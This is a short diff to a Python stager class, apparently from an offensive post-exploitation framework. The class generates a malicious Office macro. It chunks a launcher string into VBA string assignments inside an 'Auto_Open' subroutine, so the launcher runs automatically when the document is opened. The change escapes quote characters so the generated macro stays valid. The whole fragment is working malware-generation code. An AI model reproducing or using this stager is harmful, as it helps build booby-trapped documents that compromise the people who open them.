@@ -71,7 +71,7 @@ class Stager:
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -106,9 +106,9 @@ class Stager:
         else:
             chunks = list(helpers.chunks(launcher, 50))
             payload = "\tDim "+Str+" As String\n"
-            payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
+            payload += "\t"+Str+" = \"" + str(chunks[0]).replace("\"", "\"\"") + "\"\n"
             for chunk in chunks[1:]:
-                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"
+                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk).replace("\"", "\"\"") + "\"\n"
 
             macro = "Sub Auto_Open()\n"
             macro += "\t"+Method+"\n"
